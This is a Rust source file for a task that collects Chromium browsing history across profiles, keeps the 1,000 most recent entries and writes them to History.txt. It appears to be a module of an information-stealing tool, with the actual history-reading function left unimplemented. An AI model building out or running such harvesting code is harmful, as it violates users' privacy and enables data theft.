use crate::chromium::Browser;
use crate::History;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};

pub(super) struct HistoryTask {
    browser: Arc<Browser>
}

impl HistoryTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for HistoryTask {
    parent_name!("History.txt");

    unsafe fn run(&self, parent: &Path) {
        let mut history: Vec<History> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_history(profile))
            .flat_map(|v| v.into_iter())
            .collect();

        if history.is_empty() {
            return
        }

        history.sort();
        history.dedup();


        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(1000);

        let _ = history
            .iter()
            .map(|history| history.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }


}

fn get_history(_profile: &Path) -> Option<Vec<History>> {
    todo!("implement")
}